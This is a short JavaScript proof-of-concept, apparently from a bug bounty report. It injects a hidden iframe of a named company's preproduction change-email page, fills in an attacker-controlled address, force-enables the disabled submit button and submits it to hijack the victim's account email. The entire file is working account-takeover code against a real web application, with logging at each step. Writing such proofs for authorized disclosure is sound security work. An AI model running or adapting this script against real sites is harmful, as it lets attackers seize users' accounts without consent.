// Log starting point
console.log("Starting script to change email via iframe injection.");

// Create a hidden iframe to load the change-email page
console.log("Creating hidden iframe for change-email page.");
const iframe = document.createElement('iframe');
iframe.style.display = 'none';
iframe.src = 'https://app-preprod.matillion.com/hub/profile/email-and-password/change-email';
document.body.appendChild(iframe);

iframe.onload = function() {
  console.log("Iframe loaded successfully:", iframe.src);
  const doc = iframe.contentDocument || iframe.contentWindow.document;
  
  // Wait for the modal and its scripts to fully initialize
  console.log("Waiting for modal to initialize...");
  setTimeout(() => {
    console.log("Looking for the email input field...");
    // Locate the email input field by its name attribute
    const emailInput = doc.querySelector('input[name="email"]');
    if (emailInput) {
      console.log("Email input field found. Setting value to thetiger+attacker@bugcrowdninja.com");
      emailInput.value = "thetiger+attacker@bugcrowdninja.com";
      
      // Dispatch an input event to trigger any associated listeners/validation
      console.log("Dispatching input event on email input.");
      emailInput.dispatchEvent(new Event('input', { bubbles: true }));
    } else {
      console.error("Email input field not found.");
      return;
    }
    
    // Wait for any internal validation logic to process the input
    console.log("Waiting for internal validation logic to process the email input...");
    setTimeout(() => {
      console.log("Looking for the submit (Change) button...");
      // Locate the Change button (submit button)
      const changeButton = doc.querySelector('button[type="submit"]');
      if (changeButton) {
        console.log("Submit button found.");
        // If it remains disabled, force-enable it
        if (changeButton.disabled) {
          console.log("Submit button is disabled. Enabling it.");
          changeButton.disabled = false;
        }
        console.log("Clicking the submit button to send the email change request.");
        changeButton.click();
      } else {
        console.error("Submit button not found.");
      }
    }, 500); // Adjust timing if needed for button to enable
  }, 1000); // Adjust timing as needed for the modal to fully load
};
